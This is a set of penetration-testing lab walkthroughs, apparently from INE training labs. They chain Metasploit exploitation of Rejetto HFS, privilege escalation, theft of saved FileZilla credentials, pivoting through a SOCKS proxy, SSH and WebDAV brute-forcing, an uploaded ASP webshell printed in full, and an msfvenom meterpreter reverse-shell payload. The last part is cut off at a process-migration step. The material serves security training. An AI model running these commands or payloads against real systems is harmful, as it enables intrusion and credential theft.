`nmap -sS -Pn demo.ine.local demo1.ine.local`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-07 20:56 IST
Nmap scan report for demo.ine.local (10.4.20.158)
Host is up (0.0082s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http ←
135/tcp  open  msrpc ←
139/tcp  open  netbios-ssn ←
445/tcp  open  microsoft-ds ←
1025/tcp open  NFS-or-IIS
1026/tcp open  LSA-or-nterm
1027/tcp open  IIS
1028/tcp open  unknown
1046/tcp open  wfremotertm
1047/tcp open  neod1
1052/tcp open  ddt
3389/tcp open  ms-wbt-server ←

Nmap scan report for demo1.ine.local (10.4.19.156)
Host is up.
All 1000 scanned ports on demo1.ine.local (10.4.19.156) are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap done: 2 IP addresses (2 hosts up) scanned in 6.37 seconds
```

**Step 2**.

`nmap -sV demo.ine.local -p 80`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-07 21:05 IST
Nmap scan report for demo.ine.local (10.4.20.158)
Host is up (0.0089s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3 ←
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.75 seconds
```

**Step 3**.

`msfconsole`, `search hfs`, `use exploit/windows/http/rejetto_hfs_exec`, `show options`, `set RHOSTS 10.4.20.158`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, `exploit -j`.

**Step 4**.

`sessions`, `sessions -i 1`, `sysinfo`:
```
Computer        : ATTACKDEFENSE
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
```

`getuid`:
```
Server username: ATTACKDEFENSE\Administrator ←
```

`getsystem`:
```
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM ←
```

**Step 5**.

`shell`, `ping 10.4.19.156 -n 1`:
```
Pinging 10.4.28.1 with 32 bytes of data:
Reply from 10.4.28.1: bytes=32 time<1ms TTL=128

Ping statistics for 10.4.28.1:
    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss), ←
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```

**Step 6**.

`exit`, `run post/windows/gather/enum_applications`:
```
[*] Enumerating applications installed on ATTACKDEFENSE

Installed Applications
======================

 Name                                                                Version
 ----                                                                -------
 AWS PV Drivers                                                      8.4.0
 AWS Tools for Windows                                               3.15.1494
 Amazon SSM Agent                                                    3.1.338.0
 Amazon SSM Agent                                                    3.1.338.0
 EC2ConfigService                                                    4.9.4508.0
 EC2ConfigService                                                    4.9.4508.0
 EC2ConfigService                                                    4.9.4508.0
 FileZilla Client 3.57.0 ←                                           3.57.0
 Google Chrome                                                       96.0.4664.110
 Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913  14.28.29913.0
 Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.29.30040  14.29.30040.0
 Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29913      14.28.29913
 Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29913         14.28.29913
 Microsoft Visual C++ 2019 X86 Additional Runtime - 14.29.30040      14.29.30040
 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.29.30040         14.29.30040
 Nmap 7.92                                                           7.92
 Npcap                                                               1.50
 Python 3.10.1 Add to Path (64-bit)                                  3.10.1150.0
 Python 3.10.1 Core Interpreter (64-bit debug)                       3.10.1150.0
 Python 3.10.1 Core Interpreter (64-bit symbols)                     3.10.1150.0
 Python 3.10.1 Core Interpreter (64-bit)                             3.10.1150.0
 Python 3.10.1 Development Libraries (64-bit debug)                  3.10.1150.0
 Python 3.10.1 Development Libraries (64-bit)                        3.10.1150.0
 Python 3.10.1 Documentation (64-bit)                                3.10.1150.0
 Python 3.10.1 Executables (64-bit debug)                            3.10.1150.0
 Python 3.10.1 Executables (64-bit symbols)                          3.10.1150.0
 Python 3.10.1 Executables (64-bit)                                  3.10.1150.0
 Python 3.10.1 Standard Library (64-bit debug)                       3.10.1150.0
 Python 3.10.1 Standard Library (64-bit symbols)                     3.10.1150.0
 Python 3.10.1 Standard Library (64-bit)                             3.10.1150.0
 Python 3.10.1 Tcl/Tk Support (64-bit debug)                         3.10.1150.0
 Python 3.10.1 Tcl/Tk Support (64-bit symbols)                       3.10.1150.0
 Python 3.10.1 Tcl/Tk Support (64-bit)                               3.10.1150.0
 Python 3.10.1 Test Suite (64-bit debug)                             3.10.1150.0
 Python 3.10.1 Test Suite (64-bit symbols)                           3.10.1150.0
 Python 3.10.1 Test Suite (64-bit)                                   3.10.1150.0
 Python 3.10.1 Utility Scripts (64-bit)                              3.10.1150.0
 Python 3.10.1 pip Bootstrap (64-bit)                                3.10.1150.0
 Python Launcher                                                     3.10.7644.0
 aws-cfn-bootstrap                                                   2.0.6
 aws-cfn-bootstrap                                                   2.0.6

[+] Results stored in: /root/.msf4/loot/20240208201819_default_10.4.29.162_host.application_875414.txt
```

`background`, `search filezilla`, `sessions -i 1`, `run post/multi/gather/filezilla_client_cred`:
```
[*] Checking for Filezilla directory in: C:\Users\Administrator\AppData\Roaming
[*] Found C:\Users\Administrator\AppData\Roaming\FileZilla
[*] Reading sitemanager.xml and recentservers.xml files from C:\Users\Administrator\AppData\Roaming\FileZilla
[*] Parsing sitemanager.xml
[*]     Collected the following credentials:
[*]     Server: 10.4.27.111:21
[*]     Protocol: FTP
[*]     Username: admin ←
[*]     Password: FTPStrongPwd ←

[*] Parsing recentservers.xml
[*]     Collected the following credentials:
[*]     Server: 10.4.27.111:21
[*]     Protocol: FTP
[*]     Username: admin
[*]     Password: FTPStrongPwd
```

**Step 7**.

`background`, `route`, `route add 10.4.19.0/24 1`, `route`:
```
IPv4 Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.4.19.0          255.255.252.0      Session 1 ←

[*] There are currently no IPv6 routes defined.
```

`proxychains --version`:
```
[proxychains] config file found: /etc/proxychains4.conf ←
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
proxychains can't load process....: No such file or directory
```

`cat /etc/proxychains4.conf`:
```
...

[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks4		127.0.0.1	9050 ←
```

`search socks`, `use auxiliary/server/socks_proxy`, `show options`, `set SRVPORT 9050`, `set VERSION 4a`, `run`, `jobs`.

**Step 8**.

`proxychains ping 10.4.20.122 -c 3`:
```
[*] exec: proxychains ping 10.4.20.122 -c 3

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
PING 10.4.20.122 (10.4.20.122) 56(84) bytes of data.

--- 10.4.20.122 ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 2049ms ←
```

`proxychains nmap demo1.ine.local -p1-50 -Pn -sS`:
```
[*] exec: proxychains nmap 10.4.20.122 -sS -Pn -p1-50

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-08 21:40 IST
Nmap scan report for demo1.ine.local (10.4.20.122)
Host is up.
All 50 scanned ports on demo1.ine.local (10.4.20.122) are in ignored states.
Not shown: 50 filtered tcp ports (no-response) ←

Nmap done: 1 IP address (1 host up) scanned in 11.18 seconds
```

`proxychains nmap demo1.ine.local -p1-50 -Pn -sT`:
```
[*] exec: proxychains nmap 10.4.20.122 -sT -Pn -p1-50

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-08 21:37 IST
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:22  ...  OK ←
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:25 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:23 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:21  ...  OK ←
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:48 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:33 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:47 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:26 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:49 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:28 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:13 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:30 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:50 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:24 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:44 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:6 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:4 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:3 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:8 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:29 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:9 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:12 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:37 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:20 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:17 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:14 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:35 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:36 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:19 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:46 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:7 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:40 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:45 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:27 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:39 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:31 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:2 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:16 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:11 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:18 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:38 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:42 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:10 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:5 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:15 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:41 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:32 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:43 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:34 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.20.122:1 <--denied
Nmap scan report for demo1.ine.local (10.4.20.122)
Host is up (1.1s latency).
Not shown: 48 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp ←
22/tcp open  ssh ←

Nmap done: 1 IP address (1 host up) scanned in 53.42 seconds
```

**Step 9**.

`search ftp login`, `use auxiliary/scanner/ftp/ftp_login`, `show options`, `set RHOSTS demo1.ine.local`, `set USERNAME admin`, `set PASSWORD FTPStrongPwd`, `exploit`:
```
[*] 10.4.20.122:21          - 10.4.20.122:21 - Starting FTP login sweep
[!] 10.4.20.122:21          - No active DB -- Credential data will not be saved!
[+] 10.4.20.122:21          - 10.4.20.122:21 - Login Successful: admin:FTPStrongPwd
[*] demo1.ine.local:21		- Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

`proxychains ftp 10.4.27.53`:
```
[*] exec: proxychains ftp 10.4.27.53

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.27.53:21  ...  OK
Connected to 10.4.27.53.
220-FileZilla Server 1.2.0
220 Please visit https://filezilla-project.org/
Name (10.4.27.53:root): admin ←
331 Please, specify the password.
Password: ←
230 Login successful. ←
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||49380|)
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.27.53:49380  ...  OK
150 Starting data transfer.
drwxrwxrwx 1 ftp ftp               0 May 21  2014 AccountPictures
drwxrwxrwx 1 ftp ftp               0 Jan 11  2022 Desktop
-rw-rw-rw- 1 ftp ftp             174 Aug 22  2013 desktop.ini
drwxrwxrwx 1 ftp ftp               0 Aug 22  2013 Documents
drwxrwxrwx 1 ftp ftp               0 Aug 22  2013 Downloads
drwxrwxrwx 1 ftp ftp               0 Aug 22  2013 Libraries
drwxrwxrwx 1 ftp ftp               0 Aug 22  2013 Music
drwxrwxrwx 1 ftp ftp               0 Aug 22  2013 Pictures
-rw-rw-rw- 1 ftp ftp              32 Jan 11  2022 usernames.txt ←
drwxrwxrwx 1 ftp ftp               0 Aug 22  2013 Videos
226 Operation successful
ftp> get usernames.txt ←
local: usernames.txt remote: usernames.txt
229 Entering Extended Passive Mode (|||49382|)
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.27.53:49382  ...  OK
150 Starting data transfer.
100% |*********************************************************************************************************|    32        0.10 KiB/s    00:00 ETA
226 Operation successful
32 bytes received in 00:00 (0.10 KiB/s)
```

`cat usernames.txt`:
```
administrator ←
sysadmin
```

**Step 10**.

`proxychains hydra -l Administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo1.ine.local ssh`:
```
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.27.53:22  ...  OK
[22][ssh] host: 10.4.27.53   login: Administrator   password: password1 ←
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-08 22:34:06
```

**Step 11**.

`background`, `search ssh login`, `use auxiliary/scanner/ssh/ssh_login`, `show options`, `set RHOSTS demo1.ine.local`, `set USERNAME Administrator`, `set PASSWORD password1`, `exploit`, `sessions`, `sessions -i 2`:
```
[*] Starting interaction with 2...

Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

administrator@ATTACKDEFENSE C:\Users\Administrator>
administrator@ATTACKDEFENSE C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5CD6-020B

 Directory of C:\Users\Administrator

12/31/2021  09:50 AM    <DIR>          .
12/31/2021  09:50 AM    <DIR>          ..
12/31/2021  09:50 AM    <DIR>          Contacts
01/04/2022  03:35 AM    <DIR>          Desktop
12/31/2021  09:50 AM    <DIR>          Documents
01/11/2022  08:31 PM    <DIR>          Downloads
12/31/2021  09:50 AM    <DIR>          Favorites
12/31/2021  09:50 AM    <DIR>          Links
12/31/2021  09:50 AM    <DIR>          Music
12/31/2021  09:50 AM    <DIR>          Pictures
12/31/2021  09:50 AM    <DIR>          Saved Games
12/31/2021  09:50 AM    <DIR>          Searches
12/31/2021  09:50 AM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   6,550,564,864 bytes free

administrator@ATTACKDEFENSE C:\Users\Administrator>dir C:\
dir C:\
 Volume in drive C has no label.
 Volume Serial Number is 5CD6-020B

 Directory of C:\

01/11/2022  08:52 PM                32 FLAG1.txt ←
08/22/2013  03:52 PM    <DIR>          PerfLogs
01/11/2022  08:31 PM    <DIR>          Program Files
01/04/2022  04:24 AM    <DIR>          Program Files (x86)
12/31/2021  09:50 AM    <DIR>          Users
01/04/2022  03:37 AM    <DIR>          Windows
               1 File(s)             32 bytes
               5 Dir(s)   6,550,564,864 bytes free

administrator@ATTACKDEFENSE C:\Users\Administrator>type C:\FLAG1.txt ←
type C:\FLAG1.txt
a3dcb4d229de6fde0db5686dee47145d ←
```

### Blind Penetration Test - Lab

In this lab, you will learn to scan the target machine to discover the IIS service and perform information gathering using dirb and davtest tools.

In this lab environment, the user will get access to a Kali GUI instance. An instance of the vulnerable service can be accessed using the tools installed on Kali at http://demo.ine.local.

Dictionaries to use: * /usr/share/metasploit-framework/data/wordlists/common_users.txt * /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

Objective: Exploit the target to gain the shell and find the flags!

The best tools for this lab are:
- Nmap
- Metasploit Framework
- dirb
- davtest

---

**Step 1**.

`ping demo.ine.local -c 3`:
```
PING demo.ine.local (10.4.18.195) 56(84) bytes of data.
64 bytes from demo.ine.local (10.4.18.195): icmp_seq=1 ttl=125 time=9.68 ms
64 bytes from demo.ine.local (10.4.18.195): icmp_seq=2 ttl=125 time=8.93 ms
64 bytes from demo.ine.local (10.4.18.195): icmp_seq=3 ttl=125 time=8.97 ms

--- demo.ine.local ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms ←
rtt min/avg/max/mdev = 8.929/9.190/9.676/0.343 ms
```

`nmap -sS demo.ine.local -Pn -n`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-12 23:08 IST
Nmap scan report for demo.ine.local (10.4.18.195)
Host is up (0.0092s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http ←

Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds
```

**Step 2**.

`nmap -sV demo.ine.local -p80`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-12 23:13 IST
Nmap scan report for demo.ine.local (10.4.18.195)
Host is up (0.0092s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0 ←
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
```

`firefox http://demo.ine.local:80 &`: OWASP WebGoat.NET.

**Step 3**.

*DIRB* is a Web Content Scanner. It looks for existing (and hidden) Web Objects. It works by launching a dictionary-based attack against a web server and analyzing the response. DIRB comes with a set of preconfigured attack wordlists for easy usage, but you can use your custom wordlists.
Also, DIRB sometimes is used as a traditional CGI scanner, but remember it is a content scanner, not a vulnerability scanner.
DIRB's main purpose is to help in professional web application auditing. Especially in security-related testing. It covers some holes not protected by traditional web vulnerability scanners. DIRB looks for specific web objects that other generic CGI scanners can't look for. It doesn't search vulnerabilities, nor does it look for web content that can be vulnerable. 

`dirb http://demo.ine.local`:
```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Feb 12 23:28:22 2024
URL_BASE: http://demo.ine.local/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://demo.ine.local/ ----
==> DIRECTORY: http://demo.ine.local/app_themes/                                                                                                     
==> DIRECTORY: http://demo.ine.local/aspnet_client/                                                                                                  
==> DIRECTORY: http://demo.ine.local/configuration/                                                                                                  
==> DIRECTORY: http://demo.ine.local/content/                                                                                                        
==> DIRECTORY: http://demo.ine.local/Content/                                                                                                        
==> DIRECTORY: http://demo.ine.local/downloads/                                                                                                      
==> DIRECTORY: http://demo.ine.local/Downloads/                                                                                                      
==> DIRECTORY: http://demo.ine.local/resources/                                                                                                      
==> DIRECTORY: http://demo.ine.local/Resources/                                                                                                      
+ http://demo.ine.local/webdav (CODE:401|SIZE:1293) ←
```

We notice that the `/webdav` path is protected and receives HTTP code 401 error (i.e. unauthorized).

Multiple tools are available to run brute-force attacks to find valid credentials to access the protected directory.
With the help of those credentials, we can access the `/webdav**` folder, where we might have the file upload access.

**Step 4**.

Before, we run the brute-force attack. Let's identify the password authentication type (i.e. basic or digest).

`davtest -url http://demo.ine.local/webdav`:
```
********************************************************
 Testing DAV connection
OPEN            FAIL:   http://demo.ine.local/webdav    Unauthorized. Basic realm="demo.ine.local" ←
```

**Step 5**.

`msfconsole -q`, `search http login`, `use auxiliary/scanner/http/http_login`, `show options`, `set demo.ine.local`, `set AUTH_URI /webdav/`, `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`, `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`, `set VERBOSE false`, `exploit`:
```
[*] Attempting to login to http://demo.ine.local:80/webdav/ (10.4.21.235)
[+] 10.4.21.235:80 - Success: 'bob:sunshine' ←
[+] 10.4.21.235:80 - Success: 'administrator:tigger' ←
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**Step 6**.

*DAVTest* tests WebDAV-enabled servers by uploading executable test files and then (optionally) uploading files that allow for command execution or other actions directly on the target. It is meant for penetration testers to quickly and easily determine if enabled DAV services are exploitable.
DAVTest supports:
- Automatically send exploit files
- Automatic randomization of the directory to help hide files
- Send text files and try MOVE to the executable name
- Basic and Digest authorization
- Automatic clean-up of uploaded files
- Send an arbitrary file

Let's run the davtest and enumerate the /webdav folder for uploadable and executable files.

`davtest -url http://demo.ine.local/webdav -auth administrator:tigger`:
```
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://demo.ine.local/webdav
********************************************************
NOTE    Random string for this session: kUGSP8z7
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://demo.ine.local/webdav/DavTestDir_kUGSP8z7
********************************************************
 Sending test files
PUT     jhtml   SUCCEED:        http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.jhtml
PUT     txt     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.txt
PUT     asp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.asp
PUT     jsp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.jsp
PUT     php     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.php
PUT     pl      SUCCEED:        http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.pl
PUT     aspx    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.aspx
PUT     shtml   SUCCEED:        http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.shtml
PUT     html    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.html
PUT     cgi     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.cgi
PUT     cfm     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.cfm
********************************************************
 Checking for test file execution
EXEC    jhtml   FAIL
EXEC    txt     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.txt
EXEC    asp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.asp
EXEC    jsp     FAIL
EXEC    php     FAIL
EXEC    pl      FAIL
EXEC    aspx    FAIL
EXEC    shtml   FAIL
EXEC    html    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.html
EXEC    cgi     FAIL
EXEC    cfm     FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://demo.ine.local/webdav/DavTestDir_kUGSP8z7
PUT File: http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.jhtml
PUT File: http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.txt
PUT File: http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.asp
PUT File: http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.jsp
PUT File: http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.php
PUT File: http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.pl
PUT File: http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.aspx
PUT File: http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.shtml
PUT File: http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.html
PUT File: http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.cgi
PUT File: http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.cfm
Executes: http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.txt
Executes: http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.asp ←
Executes: http://demo.ine.local/webdav/DavTestDir_kUGSP8z7/davtest_kUGSP8z7.html
```

**Step 7**.

We can now take advantage of this misconfiguration and upload a malicious `.asp` backdoor, that allows command execution on the target machine (i.e. `/usr/share/webshells/asp/webshell.asp`), using cadaver utility.

`cat /usr/share/webshells/asp/webshell.asp`:
```
<!DOCTYPE html>
<html>
<head>
    <title>Server Information</title>
</head>
<body>
    <form action="" method="GET">
        <label for="cmd">Enter command:</label>
        <input type="text" name="cmd" id="cmd" size="45" value="<%= szCMD %>"> ←
        <input type="submit" value="Run">
    </form>
    <pre>
        <%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
        <%= Request.ServerVariables("server_name") %>

        <b>The server's port:</b>
        <%= Request.ServerVariables("server_port") %>

        <b>The server's software:</b>
        <%= Request.ServerVariables("server_software") %>

        <b>The server's local address:</b>
        <%= Request.ServerVariables("LOCAL_ADDR") %>

        <% szCMD = Request("cmd") ←
        thisDir = getCommandOutput("cmd /c" & szCMD)
        Response.Write(thisDir) %>
    </pre>
</body>
</html>
```

`cadaver http://demo.ine.local/webdav`:
```
Authentication required for demo.ine.local on server `demo.ine.local':
Username: administrator
Password: 
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:   DavTestDir_kUGSP8z7                    0  Feb 13 13:46
        AttackDefense.txt                     13  Jan  2  2021
        web.config                           168  Jan  2  2021
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp ←
Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
Progress: [=============================>] 100.0% of 1362 bytes succeeded.
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:   DavTestDir_kUGSP8z7                    0  Feb 13 13:46
        AttackDefense.txt                     13  Jan  2  2021
        web.config                           168  Jan  2  2021
        webshell.asp                        1362  Feb 13 13:56 ←
```

**Step 8**.

`msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform Windows LHOST=10.10.80.3 LPORT=4444 -f exe -o /root/Desktop/reverse_tcp64.exe`

`cadaver http://demo.ine.local/webdav`:
```
Authentication required for demo.ine.local on server `demo.ine.local':
Username: administrator
Password: 
dav:/webdav/> put /root/Desktop/reverse_tcp64.exe 
Uploading /root/Desktop/reverse_tcp64.exe to `/webdav/reverse_tcp64.exe':
Progress: [=============================>] 100.0% of 7168 bytes succeeded. ←
```

`msfconsole -q`, `search multi handler`, `use exploit/multi/handler`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, `set LHOST 10.10.80.3`, `set LPORT 4444`, `exploit`.

**Step 9**.

`firefox http://demo.ine.local/webdav &`.

`http://demo.ine.local/webdav/webshell.asp?cmd=where+%2FR+C%3A%5C+reverse_tcp64.exe` (`where /R C:\ reverse_tcp64.exe`):
```
\\DOTNETGOAT\Administratordemo.ine.local


The server's port:
80


The server's software:
Microsoft-IIS/10.0


The server's local address:
10.4.17.83C:\inetpub\wwwroot\webdav\reverse_tcp64.exe ←
```

`C:\inetpub\wwwroot\webdav\reverse_tcp64.exe`.

**Step 10**.

`ps -S explorer.exe`:
```
Filtering on 'explorer.exe'

Process List
============

 PID   PPID  Name          Arch  Session  User  Path
 ---   ----  ----          ----  -------  ----  ----
 4248  4200  explorer.exe
```

`migrate 4248`:
```
